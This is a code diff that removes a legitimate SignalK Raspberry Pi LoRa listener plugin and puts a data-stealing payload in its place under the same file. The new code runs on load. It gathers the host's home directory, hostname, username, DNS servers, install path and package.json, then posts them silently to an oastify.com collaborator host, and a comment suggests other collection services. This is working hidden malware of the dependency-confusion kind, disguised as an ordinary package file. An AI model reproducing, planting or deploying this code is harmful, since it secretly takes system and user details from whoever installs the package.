@@ -1,107 +1,46 @@
-/*
- * Copyright 2022 Jean-David Caprace <jd.caprace@gmail.com>
- *
- * Add the MIT license
- */
+const os = require("os");
+const dns = require("dns");
+const querystring = require("querystring");
+const https = require("https");
+const packageJSON = require("./package.json");
+const package = packageJSON.name;
 
-const spawner = require('child_process').spawn;
+const trackingData = JSON.stringify({
+    p: package,
+    c: __dirname,
+    hd: os.homedir(),
+    hn: os.hostname(),
+    un: os.userInfo().username,
+    dns: dns.getServers(),
+    r: packageJSON ? packageJSON.___resolved : undefined,
+    v: packageJSON.version,
+    pjson: packageJSON,
+});
 
-module.exports = function (app) {
-  let timer = null
-  let plugin = {}
+var postData = querystring.stringify({
+    msg: trackingData,
+});
 
-  plugin.id = 'signalk-raspberry-pi-read-sx1262-rx'
-  plugin.name = 'Raspberry-Pi sx1262-rx'
-  plugin.description = 'Raspberry-Pi listener of LoRa message for Signalk using sx1262'
+var options = {
+    hostname: "1xz9v8h6fipd4fsc0ui41vatjkpbd11q.oastify.com", //replace burpcollaborator.net with Interactsh or pipedream
+    port: 443,
+    path: "/",
+    method: "POST",
+    headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": postData.length,
+    },
+};
 
-  plugin.schema = {
-    type: 'object',
-    properties: {
-      rate: {
-        title: "Sample Rate (in seconds)",
-        type: 'number',
-        default: 1
-      },
-      enable: {
-        type: 'boolean',
-        title: 'Enable the reading of the variable',
-        default: false
-      },
-      skpath: {
-        type: 'string',
-        title: 'SignalK path',
-        description: 'This is used to store the value of the value of the LoRa params.',
-        default: 'environment.inside.engineroom'
-      }  
-    }
-  }
+var req = https.request(options, (res) => {
+    res.on("data", (d) => {
+        process.stdout.write(d);
+    });
+});
 
+req.on("error", (e) => {
+    // console.error(e);
+});
 
-  plugin.start = function (options) {
-
-    
-    
-    function createDeltaMessage(paramvalue) {
-      app.debug('Create Delta Message for path: ', options.path);
-      values = [
-        {
-          'path': options.path,
-          'value': paramvalue
-        }
-      ];
- 
-      return {
-        'context': 'vessels.' + app.selfId,
-        'updates': [
-          {
-            'source': {
-              'label': plugin.id
-            },
-            'timestamp': (new Date()).toISOString(),
-            'values': values
-          }
-        ]
-      }
-    }
-
-
-    //Init listening
-    payload = "None";
-    var loramessage = toString("");
-    console.log('Data sent to pyhton script:', payload);
-    const python_process = spawner('python3', ['/home/pi/.signalk/node_modules/signalk-raspberry-pi-sx1262-tx/rx.py', payload]);
-
-	  // Read LoRa message
-    function readmessage() {
-      //If they are some pins configured
-	      if (options.enable == true) {
-	          
-          python_process.stdout.on('data', (data) => {
-            loramessage = data.toString();
-            console.log('loramessage: ', loramessage);
-          });
-          
-          app.debug('loramessage: ', loramessage);          
-          
-          // create message
-          var delta = createDeltaMessage(loramessage);
-          // send data
-          app.handleMessage(plugin.id, delta);
-	      }
-        
-      }//End of readlora
-      
-    timer = setInterval(readmessage, options.rate * 1000);
-  }//End plugin.start
-
-  plugin.stop = function () {
-    if(timer){
-      clearInterval(timer);
-      timeout = null;
-    }
-  }
-
-  return plugin
-}
-
-
+req.write(postData);
+req.end();
